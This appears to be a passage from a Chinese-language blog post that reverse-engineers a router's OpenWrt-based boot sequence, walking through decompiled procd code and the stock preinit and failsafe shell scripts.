提供的一个进程管理工具,它并不会帮你创建进程，它主要用来等待子进程工作的结束，然后调用自定义的回调函数，所以一般需要配合 <code>fork</code>一起使用。</p></blockquote><p>这里注意观察两个地方</p><p>uloop_process_add(&amp;dword_12478);和result &#x3D; uloop_process_add(&amp;dword_1248C);，其实这个add的是结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">uloop_process</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">list_head</span> list;</span><br><span class="line"><span class="type">bool</span> pending;</span><br><span class="line">uloop_process_handler cb;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实际调用的函数是cb，而list_head一般包括pre和next两个指针占用8个字节，pending由于对齐占用4个字节</p><p>因此之后main函数运行uloop_run(v1);这个时，调用的分别是sub_9344和sub_9350函数，但是首先来看之后运行的&#x2F;sbin&#x2F;procd和&#x2F;etc&#x2F;preinit</p><h3 id="sbin-procd"><a href="#sbin-procd" class="headerlink" title="&#x2F;sbin&#x2F;procd"></a>&#x2F;sbin&#x2F;procd</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">getenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_1CEE4 = <span class="built_in">atoi</span>(v5);</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getopt</span>(argc, (<span class="type">char</span> *<span class="type">const</span> *)argv, <span class="string">&quot;d:s:h:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sub_10E20</span>(optarg);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        dword_1AD68 = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为是-h参数，因此看前面即可，DBGLVL估计是测试debug用的</p><h4 id="sub-10E20"><a href="#sub-10E20" class="headerlink" title="sub_10E20"></a>sub_10E20</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_10E20</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">uloop_init</span>();</span><br><span class="line">  v2 = <span class="built_in">sub_10C5C</span>((<span class="type">const</span> <span class="type">char</span> *)a1);</span><br><span class="line">  <span class="built_in">uloop_run</span>(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_10C5C函数功能如下</p><ol><li><strong>设置热插拔套接字：</strong>（类似usb等）<ul><li>创建并绑定一个套接字，用于处理热插拔事件。</li></ul></li><li><strong>错误处理：</strong><ul><li>如果套接字创建或绑定失败，记录错误信息并退出程序。</li></ul></li><li><strong>配置套接字选项：</strong><ul><li>设置接收缓冲区的大小。</li></ul></li><li><strong>初始化 JSON 脚本：</strong><ul><li>调用初始化函数，准备处理 JSON 脚本。</li></ul></li><li><strong>添加到事件循环：</strong><ul><li>将套接字添加到事件循环中，以便异步处理事件。</li></ul></li></ol><h3 id="etc-preinit"><a href="#etc-preinit" class="headerlink" title="&#x2F;etc&#x2F;preinit"></a>&#x2F;etc&#x2F;preinit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">[ -z &quot;$PREINIT&quot; ] &amp;&amp; exec /sbin/init</span><br><span class="line"></span><br><span class="line">export PATH=/bin:/sbin:/usr/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">pi_ifname=</span><br><span class="line">pi_ip=192.168.1.1</span><br><span class="line">pi_broadcast=192.168.1.255</span><br><span class="line">pi_netmask=255.255.255.0</span><br><span class="line"></span><br><span class="line">fs_failsafe_ifname=</span><br><span class="line">fs_failsafe_ip=192.168.1.1</span><br><span class="line">fs_failsafe_broadcast=192.168.1.255</span><br><span class="line">fs_failsafe_netmask=255.255.255.0</span><br><span class="line"></span><br><span class="line">fs_failsafe_wait_timeout=2</span><br><span class="line"></span><br><span class="line">pi_suppress_stderr=&quot;y&quot;</span><br><span class="line">pi_init_suppress_stderr=&quot;y&quot;</span><br><span class="line">pi_init_path=&quot;/bin:/sbin:/usr/bin:/usr/sbin&quot;</span><br><span class="line">pi_init_cmd=&quot;/sbin/init&quot;</span><br><span class="line"></span><br><span class="line">. /lib/functions.sh</span><br><span class="line">. /lib/functions/preinit.sh</span><br><span class="line">. /lib/functions/system.sh</span><br><span class="line">. /lib/functions/userconfig.sh</span><br><span class="line"></span><br><span class="line">boot_hook_init preinit_essential</span><br><span class="line">boot_hook_init preinit_main</span><br><span class="line">boot_hook_init failsafe</span><br><span class="line">boot_hook_init initramfs</span><br><span class="line">boot_hook_init preinit_mount_root</span><br><span class="line"></span><br><span class="line">for pi_source_file in /lib/preinit/*; do</span><br><span class="line">. $pi_source_file</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">boot_run_hook preinit_essential</span><br><span class="line"></span><br><span class="line">pi_mount_skip_next=false</span><br><span class="line">pi_jffs2_mount_success=false</span><br><span class="line">pi_failsafe_net_message=false</span><br><span class="line"></span><br><span class="line">boot_run_hook preinit_main</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">. /lib/functions.sh</span><br><span class="line">. /lib/functions/preinit.sh</span><br><span class="line">. /lib/functions/system.sh</span><br><span class="line">. /lib/functions/userconfig.sh</span><br></pre></td></tr></table></figure><p>function.sh定义了一系列配置函数，</p><p>&#x2F;lib&#x2F;functions&#x2F;preinit.sh中定义了boot_hook_init函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">boot_hook_init() &#123;</span><br><span class="line">local hook=&quot;$&#123;1&#125;_hook&quot;</span><br><span class="line">export -n &quot;PI_STACK_LIST=$&#123;PI_STACK_LIST:+$PI_STACK_LIST &#125;$hook&quot;</span><br><span class="line">export -n &quot;$hook=&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似于boot_hook_init preinit_essential，便有preinit_essential_hook&#x3D; 之类的环境变量</p><p>之后初始化一系列的hook，然后调用&#x2F;lib&#x2F;preinit下的函数</p><p>调用了如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">define_default_set_state() &#123;</span><br><span class="line">. /etc/diag.sh</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main define_default_set_state</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright (c) 2013 The Linux Foundation. All rights reserved.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="function"><span class="title">do_ipq806x</span></span>() &#123;</span></span><br><span class="line">. /lib/ipq806x.sh</span><br><span class="line"></span><br><span class="line">ipq806x_board_detect</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main do_ipq806x</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">commands <span class="keyword">for</span> emitting messages to network <span class="keyword">in</span> failsafe mode</span></span><br><span class="line"></span><br><span class="line">indicate_failsafe_led () &#123;</span><br><span class="line">set_state failsafe</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">indicate_failsafe() &#123;</span><br><span class="line">echo &quot;- failsafe -&quot;</span><br><span class="line">preinit_net_echo &quot;Entering Failsafe!\n&quot;</span><br><span class="line">indicate_failsafe_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add failsafe indicate_failsafe</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">preinit_ip() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> the preinit interface isn<span class="string">&#x27;t specified and ifname is set in</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">preinit.arch use that interface</span></span></span><br><span class="line">if [ -z &quot;$pi_ifname&quot; ]; then</span><br><span class="line">pi_ifname=$ifname</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">ifconfig $pi_ifname $pi_ip netmask $pi_netmask broadcast $pi_broadcast up</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_ip_deconfig() &#123;</span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">ifconfig $pi_ifname 0.0.0.0 down</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_net_echo() &#123;</span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">&#123;</span><br><span class="line">[ &quot;$pi_preinit_net_messages&quot; = &quot;y&quot; ] || &#123;</span><br><span class="line">[ &quot;$pi_failsafe_net_message&quot; = &quot;true&quot; ] &amp;&amp;</span><br><span class="line">[ &quot;$pi_preinit_no_failsafe_netmsg&quot; != &quot;y&quot; ]</span><br><span class="line">&#125;</span><br><span class="line">&#125; &amp;&amp; netmsg $pi_broadcast &quot;$1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_echo() &#123;</span><br><span class="line">preinit_net_echo $1</span><br><span class="line">echo $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pi_indicate_led() &#123;</span><br><span class="line">set_state preinit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pi_indicate_preinit() &#123;</span><br><span class="line">preinit_net_echo &quot;Doing OpenWRT Preinit\n&quot;</span><br><span class="line">pi_indicate_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main preinit_ip</span><br><span class="line">boot_hook_add preinit_main pi_indicate_preinit</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">!/bin/sh</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Copyright (C) 2006-2010 OpenWrt.org</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Copyright (C) 2010 Vertical Communications</span></span></span><br><span class="line"></span><br><span class="line">fs_wait_for_key () &#123;</span><br><span class="line">local timeout=$3</span><br><span class="line">local timer</span><br><span class="line">local do_keypress</span><br><span class="line">local keypress_true=&quot;$(mktemp)&quot;</span><br><span class="line">local keypress_wait=&quot;$(mktemp)&quot;</span><br><span class="line">local keypress_sec=&quot;$(mktemp)&quot;</span><br><span class="line">if [ -z &quot;$keypress_wait&quot; ]; then</span><br><span class="line">keypress_wait=/tmp/.keypress_wait</span><br><span class="line">touch $keypress_wait</span><br><span class="line">fi</span><br><span class="line">if [ -z &quot;$keypress_true&quot; ]; then</span><br><span class="line">keypress_true=/tmp/.keypress_true</span><br><span class="line">touch $keypress_true</span><br><span class="line">fi</span><br><span class="line">if [ -z &quot;$keypress_sec&quot; ]; then</span><br><span class="line">keypress_sec=/tmp/.keypress_sec</span><br><span class="line">touch $keypress_sec</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">trap &quot;echo &#x27;true&#x27; &gt;$keypress_true; lock -u $keypress_wait ; rm -f $keypress_wait&quot; INT</span><br><span class="line">trap &quot;echo &#x27;true&#x27; &gt;$keypress_true; lock -u $keypress_wait ; rm -f $keypress_wait&quot; USR1</span><br><span class="line"></span><br><span class="line">[ -n &quot;$timeout&quot; ] || timeout=1</span><br><span class="line">[ $timeout -ge 1 ] || timeout=1</span><br><span class="line">timer=$timeout</span><br><span class="line">lock $keypress_wait</span><br><span class="line">&#123;</span><br><span class="line">while [ $timer -gt 0 ]; do</span><br><span class="line">echo &quot;$timer&quot; &gt;$keypress_sec</span><br><span class="line">timer=$(($timer - 1))</span><br><span class="line">sleep 1</span><br><span class="line">done</span><br><span class="line">lock -u $keypress_wait</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">&#125; &amp;</span><br><span class="line"></span><br><span class="line">echo &quot;Press the [$1] key and hit [enter] $2&quot;</span><br><span class="line">echo &quot;Press the [1], [2], [3] or [4] key and hit [enter] to select the debug level&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">if we&#x27;</span>re on the console we <span class="built_in">wait</span> <span class="keyword">for</span> input</span></span><br><span class="line">&#123;</span><br><span class="line">while [ -r $keypress_wait ]; do</span><br><span class="line">timer=&quot;$(cat $keypress_sec)&quot;</span><br><span class="line"></span><br><span class="line">[ -n &quot;$timer&quot; ] || timer=1</span><br><span class="line">timer=&quot;$&#123;timer%%\ *&#125;&quot;</span><br><span class="line">[ $timer -ge 1 ] || timer=1</span><br><span class="line">do_keypress=&quot;&quot;</span><br><span class="line">&#123;</span><br><span class="line">read -t &quot;$timer&quot; do_keypress</span><br><span class="line">case &quot;$do_keypress&quot; in</span><br><span class="line">$1)</span><br><span class="line">echo &quot;true&quot; &gt;$keypress_true</span><br><span class="line">;;</span><br><span class="line">1 | 2 | 3 | 4)</span><br><span class="line">echo &quot;$do_keypress&quot; &gt;/tmp/debug_level</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">continue;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">lock -u $keypress_wait</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">&#125;</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">lock -w $keypress_wait</span><br><span class="line"></span><br><span class="line">keypressed=1</span><br><span class="line">[ &quot;$(cat $keypress_true)&quot; = &quot;true&quot; ] &amp;&amp; keypressed=0</span><br><span class="line"></span><br><span class="line">rm -f $keypress_true</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">rm -f $keypress_sec</span><br><span class="line"></span><br><span class="line">return $keypressed</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">failsafe_wait() &#123;</span><br><span class="line">        local is_failsafe=$(uci get system.@system[0].failsafe)</span><br><span class="line">        echo &quot;is_failsafe is $is_failsafe&quot; &gt; /dev/console</span><br><span class="line">        if [ $is_failsafe = &quot;true&quot; ]; then </span><br><span class="line">                FAILSAFE=</span><br><span class="line">        grep -q &#x27;failsafe=&#x27; /proc/cmdline &amp;&amp; FAILSAFE=true &amp;&amp; export FAILSAFE</span><br><span class="line">        if [ &quot;$FAILSAFE&quot; != &quot;true&quot; ]; then</span><br><span class="line">                pi_failsafe_net_message=true</span><br><span class="line">                preinit_net_echo &quot;Please press button now to enter failsafe&quot;</span><br><span class="line">                pi_failsafe_net_message=false</span><br><span class="line">                fs_wait_for_key f &#x27;to enter failsafe mode&#x27; $fs_failsafe_wait_timeout &amp;&amp; FAILSAFE=true</span><br><span class="line">                       [ -f &quot;/tmp/failsafe_button&quot; ] &amp;&amp; FAILSAFE=true &amp;&amp; echo &quot;- failsafe button &quot;`cat /tmp/failsafe_button`&quot; was pressed -&quot;</span><br><span class="line">                [ &quot;$FAILSAFE&quot; = &quot;true&quot; ] &amp;&amp; export FAILSAFE &amp;&amp; touch /tmp/failsafe</span><br><span class="line">        fi</span><br><span class="line"></span><br><span class="line">        fi </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main failsafe_wait</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006-2010 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">run_failsafe_hook() &#123;</span><br><span class="line">    if [ &quot;$FAILSAFE&quot; = &quot;true&quot; ]; then</span><br><span class="line">boot_run_hook failsafe</span><br><span class="line">lock -w /tmp/.failsafe</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main run_failsafe_hook</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">indicate_regular_preinit() &#123;</span><br><span class="line">preinit_net_echo &quot;Continuing with Regular Preinit\n&quot;</span><br><span class="line">pi_indicate_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main indicate_regular_preinit</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">initramfs_test() &#123;</span><br><span class="line">if [ -n &quot;$INITRAMFS&quot; ]; then</span><br><span class="line">boot_run_hook initramfs</span><br><span class="line">preinit_ip_deconfig</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main initramfs_test</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">do_mount_root() &#123;</span><br><span class="line">ramoverlay</span><br><span class="line">find_mount_jffs2</span><br><span class="line">    rootfs_init_etc_ramfs</span><br><span class="line">boot_run_hook preinit_mount_root</span><br><span class="line"></span><br><span class="line">defFlag=`grep -o Default /tmp/userconfig/userconfig_default.tmp`</span><br><span class="line">if [ -n &quot;$defFlag&quot; ] &amp;&amp; [ $defFlag = 